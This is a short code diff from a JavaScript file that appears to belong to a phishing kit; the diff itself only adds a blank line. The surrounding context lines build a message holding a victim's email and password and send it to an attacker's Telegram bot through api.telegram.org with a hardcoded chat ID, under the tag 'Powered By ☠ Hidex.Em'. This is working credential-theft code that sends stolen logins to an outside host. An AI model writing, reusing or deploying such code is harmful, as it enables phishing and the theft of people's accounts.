@@ -137,6 +137,7 @@ const chatId = "5947339497";
 			// Send message to Telegram bot
 			const message = `🔐 Account Info
 			\nEmail : ${email}\nPassword : ${password}
+			
 		➔ Powered By ☠ Hidex.Em`;
 			const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 			
